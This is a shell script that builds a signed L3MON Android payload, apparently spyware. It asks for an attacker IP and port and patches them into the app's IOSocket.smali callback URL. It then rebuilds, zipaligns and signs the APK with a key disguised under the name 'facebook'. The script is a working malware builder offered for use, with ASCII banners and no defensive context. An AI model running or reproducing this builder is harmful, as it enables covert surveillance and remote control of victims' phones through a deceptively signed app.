#!/usr/bin/env sh

RED='\033[0;31m'
GRN='\033[0;32m'
SAF='\033[38;5;202m'
WIT='\033[37m'
NC='\033[0m'

echo "${SAF}    ┏┓╋╋┏━━━┳━┓┏━┳━━━┳━┓╋┏┓ ┏━━┓┏┓╋┏┳━━┳┓╋╋┏━━━┳━━━┳━━━┓    ${NC}"
echo "${SAF}    ┃┃╋╋┃┏━┓┃┃┗┛┃┃┏━┓┃┃┗┓┃┃ ┃┏┓┃┃┃╋┃┣┫┣┫┃╋╋┗┓┏┓┃┏━━┫┏━┓┃    ${NC}"
echo "${WIT}    ┃┃╋╋┗┛┏┛┃┏┓┏┓┃┃╋┃┃┏┓┗┛┃ ┃┗┛┗┫┃╋┃┃┃┃┃┃╋╋╋┃┃┃┃┗━━┫┗━┛┃    ${NC}"
echo "${WIT}    ┃┃╋┏┳┓┗┓┃┃┃┃┃┃┃╋┃┃┃┗┓┃┃ ┃┏━┓┃┃╋┃┃┃┃┃┃╋┏┓┃┃┃┃┏━━┫┏┓┏┛    ${NC}"
echo "${WIT}    ┃┗━┛┃┗━┛┃┃┃┃┃┃┗━┛┃┃╋┃┃┃ ┃┗━┛┃┗━┛┣┫┣┫┗━┛┣┛┗┛┃┗━━┫┃┃┗┓    ${NC}"
echo "${GRN}    ┗━━━┻━━━┻┛┗┛┗┻━━━┻┛╋┗━┛ ┗━━━┻━━━┻━━┻━━━┻━━━┻━━━┻┛┗━┛    ${NC}"
echo "${GRN}                          by LUCIFER    ${NC}"

smaliFile="smali/com/etechd/l3mon/IOSocket.smali"

if [ -d $PREFIX/opt/l3mon ]; then

    appPath="$PREFIX/opt/l3mon/payload"
fi

read -p "🅴🅽🆃🅴🆁 🆈🅾🆄🆁 🅸🅿   :" host
read -p "🅴🅽🆃🅴🆁 🆈🅾🆄🆁 🅿🅾🆁🆃:" port


sed -i "s#http.*#http://$host:$port?model=\"#" $appPath/$smaliFile

clear

echo "${SAF}    ┏┓╋╋┏━━━┳━┓┏━┳━━━┳━┓╋┏┓ ┏━━┓┏┓╋┏┳━━┳┓╋╋┏━━━┳━━━┳━━━┓    ${NC}"
echo "${SAF}    ┃┃╋╋┃┏━┓┃┃┗┛┃┃┏━┓┃┃┗┓┃┃ ┃┏┓┃┃┃╋┃┣┫┣┫┃╋╋┗┓┏┓┃┏━━┫┏━┓┃    ${NC}"
echo "${WIT}    ┃┃╋╋┗┛┏┛┃┏┓┏┓┃┃╋┃┃┏┓┗┛┃ ┃┗┛┗┫┃╋┃┃┃┃┃┃╋╋╋┃┃┃┃┗━━┫┗━┛┃    ${NC}"
echo "${WIT}    ┃┃╋┏┳┓┗┓┃┃┃┃┃┃┃╋┃┃┃┗┓┃┃ ┃┏━┓┃┃╋┃┃┃┃┃┃╋┏┓┃┃┃┃┏━━┫┏┓┏┛    ${NC}"
echo "${WIT}    ┃┗━┛┃┗━┛┃┃┃┃┃┃┗━┛┃┃╋┃┃┃ ┃┗━┛┃┗━┛┣┫┣┫┗━┛┣┛┗┛┃┗━━┫┃┃┗┓    ${NC}"
echo "${GRN}    ┗━━━┻━━━┻┛┗┛┗┻━━━┻┛╋┗━┛ ┗━━━┻━━━┻━━┻━━━┻━━━┻━━━┻┛┗━┛    ${NC}"
echo "${GRN}                          by LUCIFER    ${NC}"

echo "${SAF}[*]Building Payload${NC}"
sleep 5

apktool b "$appPath" -o $HOME/l3mon_output/l3mon_unsigned.apk
clear
cd $HOME/l3mon_output

clear

echo "${SAF}    ┏┓╋╋┏━━━┳━┓┏━┳━━━┳━┓╋┏┓ ┏━━┓┏┓╋┏┳━━┳┓╋╋┏━━━┳━━━┳━━━┓    ${NC}"
echo "${SAF}    ┃┃╋╋┃┏━┓┃┃┗┛┃┃┏━┓┃┃┗┓┃┃ ┃┏┓┃┃┃╋┃┣┫┣┫┃╋╋┗┓┏┓┃┏━━┫┏━┓┃    ${NC}"
echo "${WIT}    ┃┃╋╋┗┛┏┛┃┏┓┏┓┃┃╋┃┃┏┓┗┛┃ ┃┗┛┗┫┃╋┃┃┃┃┃┃╋╋╋┃┃┃┃┗━━┫┗━┛┃    ${NC}"
echo "${WIT}    ┃┃╋┏┳┓┗┓┃┃┃┃┃┃┃╋┃┃┃┗┓┃┃ ┃┏━┓┃┃╋┃┃┃┃┃┃╋┏┓┃┃┃┃┏━━┫┏┓┏┛    ${NC}"
echo "${WIT}    ┃┗━┛┃┗━┛┃┃┃┃┃┃┗━┛┃┃╋┃┃┃ ┃┗━┛┃┗━┛┣┫┣┫┗━┛┣┛┗┛┃┗━━┫┃┃┗┓    ${NC}"
echo "${GRN}    ┗━━━┻━━━┻┛┗┛┗┻━━━┻┛╋┗━┛ ┗━━━┻━━━┻━━┻━━━┻━━━┻━━━┻┛┗━┛    ${NC}"
echo "${GRN}                         by LUCIFER ${NC}"

echo "${SAF}[*]Building Payload : Done${NC}"
echo "${SAF}[*]Generating signing key${NC}"
sleep 5

keytool -genkeypair -alias facebook -keyalg RSA -keysize 2048 -validity 10000 -keystore key.jks -storepass lucifer -dname "CN=facebook, OU=Unknown, O=Unknown, L=Unknown, ST=Unknown, C=Unknown"
clear

echo "${SAF}    ┏┓╋╋┏━━━┳━┓┏━┳━━━┳━┓╋┏┓ ┏━━┓┏┓╋┏┳━━┳┓╋╋┏━━━┳━━━┳━━━┓    ${NC}"
echo "${SAF}    ┃┃╋╋┃┏━┓┃┃┗┛┃┃┏━┓┃┃┗┓┃┃ ┃┏┓┃┃┃╋┃┣┫┣┫┃╋╋┗┓┏┓┃┏━━┫┏━┓┃    ${NC}"
echo "${WIT}    ┃┃╋╋┗┛┏┛┃┏┓┏┓┃┃╋┃┃┏┓┗┛┃ ┃┗┛┗┫┃╋┃┃┃┃┃┃╋╋╋┃┃┃┃┗━━┫┗━┛┃    ${NC}"
echo "${WIT}    ┃┃╋┏┳┓┗┓┃┃┃┃┃┃┃╋┃┃┃┗┓┃┃ ┃┏━┓┃┃╋┃┃┃┃┃┃╋┏┓┃┃┃┃┏━━┫┏┓┏┛    ${NC}"
echo "${WIT}    ┃┗━┛┃┗━┛┃┃┃┃┃┃┗━┛┃┃╋┃┃┃ ┃┗━┛┃┗━┛┣┫┣┫┗━┛┣┛┗┛┃┗━━┫┃┃┗┓    ${NC}"
echo "${GRN}    ┗━━━┻━━━┻┛┗┛┗┻━━━┻┛╋┗━┛ ┗━━━┻━━━┻━━┻━━━┻━━━┻━━━┻┛┗━┛    ${NC}"
echo "${GRN}                          by LUCIFER    ${NC}"

echo "${SAF}[*]Building Payload : Done${NC}"
echo "${SAF}[*]Generating signing key : Done${NC}"
echo "${WIT}[*]Zipaligning the payload${NC}"
sleep 5

zipalign -v 4 l3mon_unsigned.apk l3mon_zipaligned.apk
clear

echo "${SAF}    ┏┓╋╋┏━━━┳━┓┏━┳━━━┳━┓╋┏┓ ┏━━┓┏┓╋┏┳━━┳┓╋╋┏━━━┳━━━┳━━━┓    ${NC}"
echo "${SAF}    ┃┃╋╋┃┏━┓┃┃┗┛┃┃┏━┓┃┃┗┓┃┃ ┃┏┓┃┃┃╋┃┣┫┣┫┃╋╋┗┓┏┓┃┏━━┫┏━┓┃    ${NC}"
echo "${WIT}    ┃┃╋╋┗┛┏┛┃┏┓┏┓┃┃╋┃┃┏┓┗┛┃ ┃┗┛┗┫┃╋┃┃┃┃┃┃╋╋╋┃┃┃┃┗━━┫┗━┛┃    ${NC}"
echo "${WIT}    ┃┃╋┏┳┓┗┓┃┃┃┃┃┃┃╋┃┃┃┗┓┃┃ ┃┏━┓┃┃╋┃┃┃┃┃┃╋┏┓┃┃┃┃┏━━┫┏┓┏┛    ${NC}"
echo "${WIT}    ┃┗━┛┃┗━┛┃┃┃┃┃┃┗━┛┃┃╋┃┃┃ ┃┗━┛┃┗━┛┣┫┣┫┗━┛┣┛┗┛┃┗━━┫┃┃┗┓    ${NC}"
echo "${GRN}    ┗━━━┻━━━┻┛┗┛┗┻━━━┻┛╋┗━┛ ┗━━━┻━━━┻━━┻━━━┻━━━┻━━━┻┛┗━┛    ${NC}"
echo "${GRN}                          by LUCIFER    ${NC}"

echo "${SAF}[*]Building Payload : Done${NC}"
echo "${SAF}[*]Generating signing key : Done${NC}"
echo "${WIT}[*]Zipaligning the payload : Done${NC}"
echo "${WIT}[*]Signing the Payload${NC}"
sleep 5

apksigner sign --ks key.jks --ks-key-alias facebook --ks-pass pass:lucifer --out l3mon_signed.apk l3mon_zipaligned.apk
clear

echo "${SAF}    ┏┓╋╋┏━━━┳━┓┏━┳━━━┳━┓╋┏┓ ┏━━┓┏┓╋┏┳━━┳┓╋╋┏━━━┳━━━┳━━━┓    ${NC}"
echo "${SAF}    ┃┃╋╋┃┏━┓┃┃┗┛┃┃┏━┓┃┃┗┓┃┃ ┃┏┓┃┃┃╋┃┣┫┣┫┃╋╋┗┓┏┓┃┏━━┫┏━┓┃    ${NC}"
echo "${WIT}    ┃┃╋╋┗┛┏┛┃┏┓┏┓┃┃╋┃┃┏┓┗┛┃ ┃┗┛┗┫┃╋┃┃┃┃┃┃╋╋╋┃┃┃┃┗━━┫┗━┛┃    ${NC}"
echo "${WIT}    ┃┃╋┏┳┓┗┓┃┃┃┃┃┃┃╋┃┃┃┗┓┃┃ ┃┏━┓┃┃╋┃┃┃┃┃┃╋┏┓┃┃┃┃┏━━┫┏┓┏┛    ${NC}"
echo "${WIT}    ┃┗━┛┃┗━┛┃┃┃┃┃┃┗━┛┃┃╋┃┃┃ ┃┗━┛┃┗━┛┣┫┣┫┗━┛┣┛┗┛┃┗━━┫┃┃┗┓    ${NC}"
echo "${GRN}    ┗━━━┻━━━┻┛┗┛┗┻━━━┻┛╋┗━┛ ┗━━━┻━━━┻━━┻━━━┻━━━┻━━━┻┛┗━┛    ${NC}"
echo "${GRN}                         by LUCIFER ${NC}"

echo "${SAF}[*]Building Payload : Done${NC}"
echo "${SAF}[*]Generating signing key : Done${NC}"
echo "${WIT}[*]Zipaligning the payload : Done${NC}"
echo "${WIT}[*]Signing the Payload : done${NC}"
echo "${WIT}[*]Removing Junk files${NC}"
sleep 5

rm l3mon_signed.apk.idsig key.jks l3mon_unsigned.apk l3mon_zipaligned.apk 
clear

echo "${SAF}    ┏┓╋╋┏━━━┳━┓┏━┳━━━┳━┓╋┏┓ ┏━━┓┏┓╋┏┳━━┳┓╋╋┏━━━┳━━━┳━━━┓    ${NC}"
echo "${SAF}    ┃┃╋╋┃┏━┓┃┃┗┛┃┃┏━┓┃┃┗┓┃┃ ┃┏┓┃┃┃╋┃┣┫┣┫┃╋╋┗┓┏┓┃┏━━┫┏━┓┃    ${NC}"
echo "${WIT}    ┃┃╋╋┗┛┏┛┃┏┓┏┓┃┃╋┃┃┏┓┗┛┃ ┃┗┛┗┫┃╋┃┃┃┃┃┃╋╋╋┃┃┃┃┗━━┫┗━┛┃    ${NC}"
echo "${WIT}    ┃┃╋┏┳┓┗┓┃┃┃┃┃┃┃╋┃┃┃┗┓┃┃ ┃┏━┓┃┃╋┃┃┃┃┃┃╋┏┓┃┃┃┃┏━━┫┏┓┏┛    ${NC}"
echo "${WIT}    ┃┗━┛┃┗━┛┃┃┃┃┃┃┗━┛┃┃╋┃┃┃ ┃┗━┛┃┗━┛┣┫┣┫┗━┛┣┛┗┛┃┗━━┫┃┃┗┓    ${NC}"
echo "${GRN}    ┗━━━┻━━━┻┛┗┛┗┻━━━┻┛╋┗━┛ ┗━━━┻━━━┻━━┻━━━┻━━━┻━━━┻┛┗━┛    ${NC}"
echo "${GRN}                         by LUCIFER ${NC}"

echo "${SAF}[*]Building Payload : Done${NC}"
echo "${SAF}[*]Generating signing key : Done${NC}"
echo "${WIT}[*]Zipaligning the payload : Done${NC}"
echo "${WIT}[*]Signing the Payload : Done${NC}"
echo "${WIT}[*]Removing Junk files : Done${NC}"
echo "${GRN}[*]DONE! l3mon_signed built success${NC}"
echo "${GRN}[*]It can be found under HOME/l3mon_output Directory${NC}"